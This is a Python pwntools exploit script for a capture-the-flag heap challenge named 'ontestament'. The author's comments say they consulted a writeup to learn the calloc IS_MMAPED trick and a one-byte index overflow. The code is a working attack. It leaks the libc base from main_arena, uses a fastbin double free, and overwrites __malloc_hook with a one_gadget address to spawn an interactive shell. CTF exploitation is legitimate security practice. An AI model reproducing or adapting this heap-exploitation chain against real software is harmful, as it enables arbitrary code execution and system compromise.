#!/usr/bin/env python3

#A good fun chall.. But I was not able to solve it.. Had to peak the writeup to know about the solution
#I really had no idea about calloc not nulling out the memory when there is a IS_MMAPED bit set
#And also missed the single byte overflow on the index variable that we can use to double free
#Only found the UAF bug.. But came up with a plan to leverage into double free bug but failed due to absence of leak in my method.


from pwn import *


e = ELF("./ontestament_patched")
r = process("./ontestament_patched")
libc = ELF("./libc.so.6")
index = 0
def malloc(option,content):
    global index
    r.sendlineafter(b":",b"1")
    r.sendlineafter(b":",f"{option}")
    r.sendafter(b":",content)
    index+=1
    return index - 1

def free(index):
    r.sendlineafter(b":",b"4")
    r.sendlineafter(b":",f"{index}")


def free_special(index):
    r.sendlineafter(b":",b"4")
    r.sendafter(b":",index)

def edit(index,content):
    r.sendlineafter(b":",b"3")
    r.sendlineafter(b":",f"{index}")
    r.sendlineafter(b":",f"{content}")

chunk_A = malloc(4,b"A" * 24 + b"\n")
chunk_B = malloc(1,b"B" * 24)
free(chunk_A)
chunk_C = malloc(1,b"C" * 24)
edit(chunk_A,24)
edit(chunk_A,24)
chunk_D = malloc(3,b"D" * 7 + b"\n")
r.recvuntil(b"D" * 7 + b"\n")
libc_base = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - libc.sym.main_arena - 88
log.info("The libc base of the process is " + hex(libc_base))
chunk_E = malloc(3,b"E\n")
chunk_F = malloc(3,b"F\n")
free(chunk_E)
free(chunk_F)
free_special(b"00004")
chunk_G = malloc(3,p64(libc_base + libc.sym.__malloc_hook - 35) + b"\n") 
chunk_H = malloc(3,b"H\n")
chunk_I = malloc(3,b"I" * 8 + b"\n")
chunk_J = malloc(3,b"J" * 19 + p64(libc_base + 0x4527a)  + b"\n")
r.sendlineafter(b":",b"1")
r.sendlineafter(b":",b"1")
r.recv()
r.recvuntil(b"choice: ")
#edit(chunk_E,1)
#chunk_G = malloc(4,b"G\n")
#chunk_H = malloc(3,b"H\n")
#free(chunk_F)
#free(chunk_E)
#edit(chunk_E,1)
#free(chunk_E)
#free(chunk_H)
r.interactive()
